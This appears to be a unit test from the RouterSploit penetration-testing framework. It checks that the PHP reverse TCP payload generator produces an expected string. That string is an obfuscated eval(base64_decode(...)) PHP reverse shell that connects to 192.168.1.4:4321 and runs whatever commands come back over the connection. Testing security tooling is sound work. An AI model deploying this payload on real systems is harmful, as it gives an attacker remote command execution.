from routersploit.modules.payloads.php.reverse_tcp import Exploit


# php reverse tcp payload with lhost=192.168.1.4 lport=4321
reverse_tcp = (
    "eval(base64_decode('JHM9ZnNvY2tvcGVuKCJ0Y3A6Ly8xOTIuMTY4LjEuNCIsNDMyMSk7d2hpbGUoIWZlb2YoJHMpKXtleGVjKGZnZXRzKCRzKSwkbyk7JG89aW1wbG9kZSgiXG4iLCRvKTskby49IlxuIjtmcHV0cygkcywkbyk7fQ=='));"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Exploit()
    payload.lhost = "192.168.1.4"
    payload.lport = 4321

    assert payload.generate() == reverse_tcp
